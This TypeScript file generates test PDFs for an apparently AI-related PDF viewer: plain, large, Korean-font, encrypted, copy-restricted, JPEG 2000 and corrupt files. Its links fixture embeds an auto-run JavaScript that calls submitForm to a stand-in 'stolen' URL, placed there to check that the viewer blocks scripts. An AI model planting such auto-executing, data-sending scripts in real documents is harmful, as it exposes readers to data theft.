// 시험용 PDF를 코드로 만든다. 저작권이 없고 저장소에 PDF 파일을 넣지 않아도 된다.
// Playwright(e2e)와 Node의 타입 제거 실행(scripts/smoke-packaged.mjs) 양쪽에서 불러오므로 지울 수 있는 TS 문법만 쓴다.
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateSync } from 'node:zlib';

type PdfObject = { dict: string; stream?: Buffer };

function latin(text: string): Buffer {
  return Buffer.from(text, 'latin1');
}

function md5(...parts: Buffer[]): Buffer {
  const hash = createHash('md5');
  for (const part of parts) hash.update(part);
  return hash.digest();
}

// OpenSSL 3은 RC4를 기본으로 막아 두었으므로 직접 구현한다. 시험 파일 생성에만 쓴다.
function rc4(key: Buffer, data: Buffer): Buffer {
  const state = Array.from({ length: 256 }, (_, index) => index);
  let j = 0;
  for (let i = 0; i < 256; i += 1) {
    j = (j + (state[i] ?? 0) + (key[i % key.length] ?? 0)) & 255;
    [state[i], state[j]] = [state[j] ?? 0, state[i] ?? 0];
  }
  const output = Buffer.alloc(data.length);
  let a = 0;
  let b = 0;
  for (let index = 0; index < data.length; index += 1) {
    a = (a + 1) & 255;
    b = (b + (state[a] ?? 0)) & 255;
    [state[a], state[b]] = [state[b] ?? 0, state[a] ?? 0];
    output[index] = (data[index] ?? 0) ^ (state[((state[a] ?? 0) + (state[b] ?? 0)) & 255] ?? 0);
  }
  return output;
}

const PASSWORD_PADDING = Buffer.from(
  '28bf4e5e4e758a4164004e56fffa01082e2e00b6d0683e802f0ca9fe6453697a',
  'hex',
);

function padPassword(password: string): Buffer {
  return Buffer.concat([latin(password), PASSWORD_PADDING]).subarray(0, 32);
}

function rc4Rounds(key: Buffer, data: Buffer): Buffer {
  let output = rc4(key, data);
  for (let round = 1; round <= 19; round += 1) {
    output = rc4(Buffer.from(key.map((byte) => byte ^ round)), output);
  }
  return output;
}

// 표준 보안 처리기 리비전 3(RC4 128비트). PDF 32000-1 7.6.3의 알고리즘 2, 3, 5.
function createEncryption(userPassword: string, ownerPassword: string, permissions: number) {
  const id = md5(latin('ai-pdf-viewer-fixture'));
  let ownerKey = md5(padPassword(ownerPassword));
  for (let round = 0; round < 50; round += 1) ownerKey = md5(ownerKey);
  const owner = rc4Rounds(ownerKey, padPassword(userPassword));

  const permissionBytes = Buffer.alloc(4);
  permissionBytes.writeInt32LE(permissions);
  let key = md5(padPassword(userPassword), owner, permissionBytes, id);
  for (let round = 0; round < 50; round += 1) key = md5(key);

  const user = Buffer.concat([rc4Rounds(key, md5(PASSWORD_PADDING, id)), Buffer.alloc(16)]);
  return {
    trailerId: `[<${id.toString('hex')}> <${id.toString('hex')}>]`,
    dict: `<</Filter/Standard/V 2/R 3/Length 128/P ${String(permissions)}/O<${owner.toString('hex')}>/U<${user.toString('hex')}>>>`,
    encryptStream(objectNumber: number, data: Buffer): Buffer {
      const suffix = Buffer.from([objectNumber & 255, (objectNumber >> 8) & 255, (objectNumber >> 16) & 255, 0, 0]);
      return rc4(md5(key, suffix), data);
    },
  };
}

type Encryption = ReturnType<typeof createEncryption>;

function serialize(objects: PdfObject[], encryption?: Encryption): Buffer {
  const chunks: Buffer[] = [latin('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n')];
  let length = chunks[0]?.length ?? 0;
  const push = (chunk: Buffer): void => {
    chunks.push(chunk);
    length += chunk.length;
  };
  const offsets: number[] = [];

  const all = encryption ? [...objects, { dict: encryption.dict }] : objects;
  all.forEach((object, index) => {
    const number = index + 1;
    offsets.push(length);
    push(latin(`${String(number)} 0 obj\n`));
    if (object.stream === undefined) {
      push(latin(`${object.dict}\n`));
    } else {
      const body = encryption ? encryption.encryptStream(number, object.stream) : object.stream;
      push(latin(`<<${object.dict}/Length ${String(body.length)}>>\nstream\n`));
      push(body);
      push(latin('\nendstream\n'));
    }
    push(latin('endobj\n'));
  });

  const xrefOffset = length;
  const count = all.length + 1;
  const rows = offsets.map((offset) => `${String(offset).padStart(10, '0')} 00000 n \n`).join('');
  const encryptEntry = encryption ? `/Encrypt ${String(all.length)} 0 R/ID ${encryption.trailerId}` : '';
  push(
    latin(
      `xref\n0 ${String(count)}\n0000000000 65535 f \n${rows}trailer\n<</Size ${String(count)}/Root 1 0 R${encryptEntry}>>\nstartxref\n${String(xrefOffset)}\n%%EOF\n`,
    ),
  );
  return Buffer.concat(chunks);
}

interface PageSpec {
  content: string;
  /** 쪽의 추가 사전 항목(주석 등). */
  extra?: string;
  /** 추가 리소스(글꼴 외). */
  resources?: string;
  /** F1 외의 글꼴 항목. */
  fonts?: string;
  width?: number;
  height?: number;
}

// 1번 카탈로그, 2번 쪽 트리, 3번 Helvetica(내장하지 않은 표준 글꼴), 이후 호출자의 객체와 쪽.
class DocumentBuilder {
  private readonly objects: PdfObject[] = [
    { dict: '' },
    { dict: '' },
    { dict: '<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>' },
  ];
  private readonly pageNumbers: number[] = [];
  catalogExtra = '';

  add(object: PdfObject): number {
    this.objects.push(object);
    return this.objects.length;
  }

  addPage(page: PageSpec, compress = true): number {
    const content = latin(page.content);
    const contentNumber = this.add(
      compress ? { dict: '/Filter/FlateDecode', stream: deflateSync(content, { level: 1 }) } : { dict: '', stream: content },
    );
    const width = page.width ?? 612;
    const height = page.height ?? 792;
    const number = this.add({
      dict: `<</Type/Page/Parent 2 0 R/MediaBox[0 0 ${String(width)} ${String(height)}]/Contents ${String(contentNumber)} 0 R/Resources<</Font<</F1 3 0 R${page.fonts ?? ''}>>${page.resources ?? ''}>>${page.extra ?? ''}>>`,
    });
    this.pageNumbers.push(number);
    return number;
  }

  reservePage(): number {
    // 앞쪽 객체가 뒤쪽 쪽 번호를 가리킬 때 쓴다. 쪽 사전 번호 = 내용 번호 + 1 이다.
    return this.objects.length + 2;
  }

  build(encryption?: Encryption): Buffer {
    this.objects[0] = { dict: `<</Type/Catalog/Pages 2 0 R${this.catalogExtra}>>` };
    const kids = this.pageNumbers.map((number) => `${String(number)} 0 R`).join(' ');
    this.objects[1] = { dict: `<</Type/Pages/Kids[${kids}]/Count ${String(this.pageNumbers.length)}>>` };
    return serialize(this.objects, encryption);
  }
}

export const pageMarker = (page: number): string => `Fixture page ${String(page)} marker`;

function textPage(page: number, lineCount = 3): string {
  const lines = [`BT /F1 20 Tf 72 720 Td (${pageMarker(page)}) Tj ET`];
  for (let line = 0; line < lineCount; line += 1) {
    lines.push(
      `BT /F1 11 Tf 72 ${String(690 - line * 14)} Td (Line ${String(line + 1)} of page ${String(page)}: the quick brown fox jumps over the lazy dog) Tj ET`,
    );
  }
  lines.push('0.2 0.4 0.8 RG 2 w 72 40 468 12 re S');
  return lines.join('\n');
}

export function buildBasicPdf(pageCount: number): Buffer {
  const builder = new DocumentBuilder();
  for (let page = 1; page <= pageCount; page += 1) builder.addPage({ content: textPage(page) });
  return builder.build();
}

// 쪽마다 글과 함께 압축 이미지가 들어 있는 큰 문서. imageSide가 0이면 글만 넣는다.
export function buildLargePdf(pageCount: number, imageSide = 0): Buffer {
  const builder = new DocumentBuilder();
  let seed = 12345;
  for (let page = 1; page <= pageCount; page += 1) {
    let resources = '';
    let draw = '';
    if (imageSide > 0) {
      const pixels = Buffer.alloc(imageSide * imageSide);
      for (let index = 0; index < pixels.length; index += 1) {
        seed = (seed * 1103515245 + 12345) & 0x7fffffff;
        pixels[index] = 128 + ((index >> 6) % 64) + ((seed >> 16) & 31);
      }
      const image = builder.add({
        dict: `/Type/XObject/Subtype/Image/Width ${String(imageSide)}/Height ${String(imageSide)}/ColorSpace/DeviceGray/BitsPerComponent 8/Filter/FlateDecode`,
        stream: deflateSync(pixels, { level: 1 }),
      });
      resources = `/XObject<</Im0 ${String(image)} 0 R>>`;
      draw = 'q 300 0 0 300 156 60 cm /Im0 Do Q\n';
    }
    builder.addPage({ content: `${draw}${textPage(page, 20)}`, resources });
  }
  return builder.build();
}

// 글꼴을 내장하지 않은 한글. 글자 코드를 유니코드로 바꾸는 CMap 자산이 없으면 글자를 얻을 수 없다.
export const KOREAN_UTF16_TEXT = '한글 문서가 깨지지 않습니다';
export const KOREAN_UHC_TEXT = '한글 문서';

export function buildKoreanPdf(): Buffer {
  const builder = new DocumentBuilder();
  const descriptor = builder.add({
    dict: '<</Type/FontDescriptor/FontName/HYGoThic-Medium/Flags 6/FontBBox[-6 -145 1003 880]/ItalicAngle 0/Ascent 880/Descent -120/CapHeight 880/StemV 80>>',
  });
  const descendant = builder.add({
    dict: `<</Type/Font/Subtype/CIDFontType0/BaseFont/HYGoThic-Medium/CIDSystemInfo<</Registry(Adobe)/Ordering(Korea1)/Supplement 1>>/FontDescriptor ${String(descriptor)} 0 R/DW 1000>>`,
  });
  const utf16Font = builder.add({
    dict: `<</Type/Font/Subtype/Type0/BaseFont/HYGoThic-Medium/Encoding/UniKS-UTF16-H/DescendantFonts[${String(descendant)} 0 R]>>`,
  });
  const uhcFont = builder.add({
    dict: `<</Type/Font/Subtype/Type0/BaseFont/HYGoThic-Medium/Encoding/KSCms-UHC-H/DescendantFonts[${String(descendant)} 0 R]>>`,
  });
  const utf16Hex = Buffer.from(KOREAN_UTF16_TEXT, 'utf16le').swap16().toString('hex');
  // '한글 문서'의 CP949 코드.
  const uhcHex = 'c7d1b1db20b9aebcad';
  builder.addPage({
    fonts: `/K1 ${String(utf16Font)} 0 R/K2 ${String(uhcFont)} 0 R`,
    content: `BT /K1 28 Tf 60 700 Td <${utf16Hex}> Tj ET\nBT /K2 28 Tf 60 650 Td <${uhcHex}> Tj ET\nBT /F1 14 Tf 60 610 Td (Latin text next to Korean) Tj ET`,
  });
  return builder.build();
}

export function buildLinksPdf(): Buffer {
  const builder = new DocumentBuilder();
  // 문서를 열 때 실행되도록 등록한 스크립트. 실행되면 안 된다.
  const script = builder.add({
    dict: "<</S/JavaScript/JS(app.alert('pdf-script-ran'); this.submitForm('https://example.com/stolen');)>>",
  });
  builder.catalogExtra = `/OpenAction ${String(script)} 0 R`;

  const firstPage = builder.reservePage();
  const externalLink = builder.add({
    dict: '<</Type/Annot/Subtype/Link/Rect[72 600 300 640]/Border[0 0 1]/A<</S/URI/URI(https://example.com/outside)>>>>',
  });
  // 1쪽 내용 1개 + 쪽 1개 + 내부 링크 뒤에 2, 3쪽이 온다.
  const thirdPage = firstPage + 5 + 1;
  const internalLink = builder.add({
    dict: `<</Type/Annot/Subtype/Link/Rect[72 500 300 540]/Border[0 0 1]/Dest[${String(thirdPage)} 0 R/Fit]>>`,
  });
  builder.addPage({
    content: `${textPage(1)}\nBT /F1 14 Tf 76 612 Td (External link) Tj ET\nBT /F1 14 Tf 76 512 Td (Internal link to page 3) Tj ET`,
    extra: `/Annots[${String(externalLink)} 0 R ${String(internalLink)} 0 R]`,
  });
  builder.addPage({ content: textPage(2) });
  const actual = builder.addPage({ content: textPage(3) });
  if (actual !== thirdPage) throw new Error(`링크 시험 문서의 쪽 번호 계산이 틀렸다: ${String(actual)} != ${String(thirdPage)}`);
  return builder.build();
}

export function buildPasswordPdf(): Buffer {
  const builder = new DocumentBuilder();
  builder.addPage({ content: textPage(1) }, false);
  return builder.build(createEncryption('secret', 'owner', -44));
}

// 사용자 암호 없이 열리지만 복사 권한(비트 5)과 추출 권한(비트 10)을 끈 문서.
export function buildCopyRestrictedPdf(): Buffer {
  const builder = new DocumentBuilder();
  builder.addPage({ content: textPage(1) }, false);
  builder.addPage({ content: textPage(2) }, false);
  return builder.build(createEncryption('', 'owner', (0xfffffffc & ~(16 | 512)) | 0));
}

// macOS의 sips로 JPEG 2000 이미지를 만들어 넣는다. WebAssembly 없이 JS 디코더로 그려지는지 확인하는 용도다.
export function buildJpxPdf(): Buffer {
  const dir = mkdtempSync(join(tmpdir(), 'jpx-fixture-'));
  try {
    const side = 64;
    const header = Buffer.alloc(54);
    const rowBytes = side * 3;
    header.write('BM', 0, 'latin1');
    header.writeUInt32LE(54 + rowBytes * side, 2);
    header.writeUInt32LE(54, 10);
    header.writeUInt32LE(40, 14);
    header.writeInt32LE(side, 18);
    header.writeInt32LE(side, 22);
    header.writeUInt16LE(1, 26);
    header.writeUInt16LE(24, 28);
    // BMP 색 순서는 BGR. 전체를 빨강으로 채운다.
    const pixels = Buffer.alloc(rowBytes * side);
    for (let index = 0; index < pixels.length; index += 3) pixels[index + 2] = 220;
    const bmp = join(dir, 'in.bmp');
    const jp2 = join(dir, 'out.jp2');
    writeFileSync(bmp, Buffer.concat([header, pixels]));
    execFileSync('sips', ['-s', 'format', 'jp2', bmp, '--out', jp2], { stdio: 'ignore' });
    const builder = new DocumentBuilder();
    const image = builder.add({
      dict: `/Type/XObject/Subtype/Image/Width ${String(side)}/Height ${String(side)}/Filter/JPXDecode`,
      stream: readFileSync(jp2),
    });
    builder.addPage({
      content: 'q 612 0 0 792 0 0 cm /Im0 Do Q',
      resources: `/XObject<</Im0 ${String(image)} 0 R>>`,
    });
    return builder.build();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

export interface FixtureFiles {
  dir: string;
  basic: string;
  korean: string;
  links: string;
  password: string;
  copyRestricted: string;
  jpx: string;
  large: string;
  largeWithImages: string;
  corruptGarbage: string;
  corruptNoHeader: string;
  corruptTruncated: string;
  notPdf: string;
}

export function writeFixtures(): FixtureFiles {
  const dir = mkdtempSync(join(tmpdir(), 'ai-pdf-viewer-fixtures-'));
  mkdirSync(dir, { recursive: true });
  const write = (name: string, data: Buffer | string): string => {
    const path = join(dir, name);
    writeFileSync(path, data);
    return path;
  };
  const basic = buildBasicPdf(12);
  return {
    dir,
    basic: write('basic 기본.pdf', basic),
    korean: write('korean.pdf', buildKoreanPdf()),
    links: write('links.pdf', buildLinksPdf()),
    password: write('password.pdf', buildPasswordPdf()),
    copyRestricted: write('copy-restricted.pdf', buildCopyRestrictedPdf()),
    jpx: write('jpx.pdf', buildJpxPdf()),
    large: write('large-300.pdf', buildLargePdf(300)),
    largeWithImages: write('large-300-images.pdf', buildLargePdf(300, 900)),
    corruptGarbage: write('corrupt-garbage.pdf', Buffer.concat([latin('%PDF-1.7\n'), Buffer.alloc(4096, 0x5a)])),
    corruptNoHeader: write('corrupt-no-header.pdf', 'this is not a pdf at all'),
    corruptTruncated: write('corrupt-truncated.pdf', basic.subarray(0, 300)),
    notPdf: write('notes.txt', 'plain text'),
  };
}

export function removeFixtures(files: FixtureFiles): void {
  rmSync(files.dir, { recursive: true, force: true, maxRetries: 3, retryDelay: 100 });
}
